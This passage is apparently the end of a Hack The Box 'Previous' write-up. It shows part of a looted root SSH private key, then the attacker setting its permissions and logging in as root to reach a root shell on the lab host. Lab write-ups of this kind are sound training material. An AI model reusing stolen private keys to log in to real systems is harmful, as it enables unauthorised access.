gVTnfEDqaJV6Unf6DxfN+sJICElTWouY5IZjvgpvCwC+L6eVWUD31irnU1YNGOgKY4Zaxv
/1BqFHDcujIPZbfHx4rU0MMAIRgf6ZXkdBkn51hapYKJX4yvNXESAsCKh62JWeF+zo4DaD
YZcaEKabfnopYJ47f9k8XeCYFRgTMHkMWRuwGw+jSU4Xci0wAAAMEAugJLPFJeq2vmsrTz
/BIm5BHUBdR2EFMaPIqRkM5Ntl71Ah5bh1MMijV/deIsltEZr8Adz6NagqDxcWIaZNNQNp
v0KsoZDqQuL4KLktC9IEUS9eLpONxlNUuSG5rEieuWSASBzPyPYC63J7ZyYS0aw7d38lR5
B2U4vWe1o7jkQZQkR4UY8fgZPDoqRbu26qNgFZYssuRjhrATvcG7f4lBJICmV6JJPamngO
6mixVNXTDxYySn+MYzhUVNdqN3nqAzAAAAwQDVdEyZiNhIz5sLJjBf/a1SrjnwbKq1ofql
4TIw8Xjw5Eia1oYfbIJmSQUwvP8IsV1dcj9P8ASZYlZF30hRWVa24dCewvhqIqdMoyO9DT
7hHi8eduqnfOdnFzgVu5JZzysNSB2QKaG29FVTMKWcxo+0Voh2mXKcVyNjuYadBvn1zZ+J
4ZpqUFQKbqIj4hUUKMBOwMssxs+Eup/46wb4i0vVhe3g7I5ySdWpJ/M4vUI+ooTw6C2GoS
jR+NWPfpk9KHMAAAANcm9vdEBwcmV2aW91cwECAwQFBg==
-----END OPENSSH PRIVATE KEY-----
```

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/Previous/files]
└─$ chmod 600 root_id_rsa
```

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/Previous/files]
└─$ ssh -i root_id_rsa root@10.129.242.162
The authenticity of host '10.129.242.162 (10.129.242.162)' can't be established.
ED25519 key fingerprint is SHA256:TgNhCKF6jUX7MG8TC01/MUj/+u0EBasUVsdSQMHdyfY.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:48: [hashed name]
    ~/.ssh/known_hosts:95: [hashed name]
    ~/.ssh/known_hosts:184: [hashed name]
    ~/.ssh/known_hosts:185: [hashed name]
    ~/.ssh/known_hosts:205: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.242.162' (ED25519) to the list of known hosts.
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-152-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sun Aug 24 07:06:48 AM UTC 2025

  System load:  0.18              Processes:             248
  Usage of /:   66.6% of 8.76GB   Users logged in:       0
  Memory usage: 7%                IPv4 address for eth0: 10.129.242.162
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

1 update can be applied immediately.
1 of these updates is a standard security update.
To see these additional updates run: apt list --upgradable

1 additional security update can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


Last login: Sun Aug 24 07:06:49 2025 from 10.10.16.36
root@previous:~#
```
